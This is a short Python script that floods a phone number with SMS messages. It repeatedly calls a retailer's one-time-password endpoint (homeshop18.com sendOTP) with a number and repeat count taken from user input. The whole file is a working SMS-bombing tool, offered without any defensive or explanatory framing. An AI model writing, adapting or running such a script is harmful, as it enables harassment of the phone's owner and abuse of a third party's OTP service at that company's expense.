

import requests
number=input("Enter a phone number:")
n=int(input("How many times? :"))

for i in range(0,n,+1):
    r = requests.get ("https://www.homeshop18.com/account/sendOTP?mobileNumber="+number)
    if(r.status_code==200):
        print(i+1,"SMS sent to",number)